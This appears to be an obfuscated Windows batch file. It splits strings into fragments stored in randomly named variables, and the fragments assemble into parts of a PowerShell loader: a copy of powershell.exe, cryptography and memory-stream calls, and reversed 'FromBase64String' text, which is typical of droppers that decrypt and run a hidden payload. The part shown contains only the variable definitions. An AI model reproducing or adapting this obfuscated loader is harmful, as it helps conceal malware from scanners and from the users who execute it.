@echo off
set "HeQEjqnTJg=Po"
set "vuAsFCXEXe=po"
set "ALzKpObRDt=y "
set "CLIZHKyuaG=py"
set "tzDjgvsIem=we"
set "sGmRSOqCuV= /"
set "ZxJUEWzmjv=ll"
set "onGuJbIIic=nd"
set "zoIGqzcVwF=.e"
set "VHGfweeQLU=co"
set "RzQeYYQEGl=ow"
set "gTZYXtmEZH= C"
set "dKyTTodLvn=he"
set "qjbSKehmLU=Wi"
set "DTnBFJutCM=in"
set "rHAqqWRhnT=s\"
set "VIvHgmqtba=do"
set "cOgOHaxsno=\v"
set "JDebPrTDUE=1."
set "zdgtmSXMTt=0\"
set "NLIRRQtXTM=st"
set "retFeQRRxP=he"
set "ZqkpyGZIzA=\W"
set "UkcjaIaJqR=xe"
set "dVsFVZINCO=rs"
set "pGHyqUHJOI=rS"
set "maTfsIYAuq=Sy"
set "kAupQQGKLp=32"
set "WEUdsvtQUJ=:\"
set "wmiZurUDjl=we"
set "jImDMXsqaW=ws"
set "upFQkazWnR=ll"
set "nCFzDGNpeM=em"
set "MIEveIgxAv= %~dp0"
set "JKRpBGrfbp=cd"
set "NJLrWOBBdH=GLlM"
set "UUqnCTtETH=Obje"
set "XJNHMKRHUA=tsWi"
set "ZyDzXabVOp= '')"
set "qodsmaSueH=;$PQ"
set "gCsSFzjzbn=ress"
set "QurdXNZgil=Secu"
set "qKYqjVprlL=, $K"
set "aodcvOZFaj=.IO."
set "GquFmawkwl=y.Pa"
set "dCZAPnxYYi=rans"
set "grMObJvige=ose("
set "CxKSuAsQtX=O.Me"
set "iRGwagOfyq=tem."
set "DrudwRxnmC=lBlo"
set "IFtiNrXXTW=.Dis"
set "IIvoghrdBz=GLlM"
set "GkmGRuBfKe=oin "
set "LxBLqpZFHV=TllA"
set "qowVOOTTZg=New-"
set "eRSjePTFSa=.Len"
set "CwRyEMumbW=RG ="
set "cVLjWZiXku='txe"
set "fIlfvdzBFJ=oL'["
set "ByhhhxkZeP=('%*'"
set "RmhywxvlkX=comm"
set "YeUEQMCyvG='gni"
set "OCVoAvLWDJ=lit("
set "UovAKoUvQS=1] -"
set "diJPQjYZUb=ptor"
set "ZPIDMBrXnx=$caV"
set "RoWNDtUBWz=2Q+X"
